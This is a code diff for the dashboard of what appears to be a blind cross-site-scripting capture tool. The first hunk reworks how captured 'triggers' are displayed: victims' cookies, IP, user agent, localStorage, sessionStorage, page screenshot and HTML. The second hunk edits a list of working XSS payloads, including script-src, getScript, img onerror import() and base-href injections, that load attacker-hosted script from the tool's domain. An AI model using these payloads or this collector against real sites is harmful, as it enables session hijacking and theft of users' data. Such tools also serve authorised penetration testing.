@@ -12,22 +12,26 @@ var fields = {
 	ip: { name: 'IP' },
 	info: { 
 		name: 'More info',
-		special: function(trigger){	
-			var html = '<h5>' + trigger.url + ' [' + trigger.time + ']</h5>' +
-			'<div style="font-size: 11pt;text-align: left;padding: 0 15%;">' +
-			'<h6>Extra</h6><p>' + trigger.extra + '</p>' +
-			'<h6>Cookies</h6><p>' + trigger.cookies + '</p>' +
-			'<h6>IP</h6><p>' + trigger.ip + '</p>' +
-			'<h6>User-Agent</h6><p>' + trigger.useragent + '</p>' +
-			'<h6>localStorage</h6><p>' + trigger.localStorage + '</p>' +
-			'<h6>sessionStorage</h6><p>' + trigger.sessionStorage + '</p>' +
-			'</div>' +
-			'<a href="' + trigger.canvas + '" target="_blank"><img class="img-fluid" style="max-height:500px" src="' + trigger.canvas + '"></a>' +
-			'<textarea style="min-height:150px;font-size:11px" class="form-control" readonly>' + trigger.html + '</textarea>';
-
-			return $('<button class="btn btn-sm btn-primary">View</button>').click(function(){
-				Swal.fire({ width:'85%', html:html });
-			});	
+		special: function(trigger){
+			var $btn = $('<button class="btn btn-sm btn-primary">View</button>').click(function(){
+				$btn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>');
+				$.get('/triggers/' + trigger.id, function(e){
+					var html = '<h5>' + e.url + ' [' + e.time + ']</h5>' +
+					'<div style="font-size: 11pt;text-align: left;padding: 0 15%;">' +
+					'<h6>· Extra:</h6><p>' + e.extra + '</p>' +
+					'<h6>· Cookies:</h6><p>' + e.cookies + '</p>' +
+					'<h6>· IP:</h6><p>' + e.ip + '</p>' +
+					'<h6>· User-Agent:</h6><p>' + e.useragent + '</p>' +
+					'<h6>· localStorage:</h6><p>' + e.localStorage + '</p>' +
+					'<h6>· sessionStorage:</h6><p>' + e.sessionStorage + '</p>' +
+					'</div>' +
+					'<div style="max-height:500px; overflow:auto"><a href="' + e.canvas + '" target="_blank"><img class="img-fluid" src="' + e.canvas + '"></a></div>' +
+					'<textarea style="min-height:150px;font-size:11px" class="form-control" readonly>' + e.html + '</textarea>';
+					Swal.fire({ width:'85%', html:html });
+					$btn.html('View');
+				});
+			});
+			return $btn;
 		}
 	},
 	delete: {
@@ -93,9 +97,9 @@ $(function(){
 function show_payloads(){
 	var domain = document.location.host;
 	var payloads = [
-		'"><script src="https://' + domain + '"></script>',
-		'<script>$.getScript("//' + domain + '")</script>',
-		'<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + domain + '");a.send();</script>',
+		'"><script src="//' + domain + '"></script>',
+		'"><script>$.getScript("//' + domain + '")</script>',
+		'"><img/src=x onerror="import(\'//' + domain + '\')">',
 		'"><base href="//' + domain + '"><script src="./"></script>'
 	];
 	var div = $('<div>');
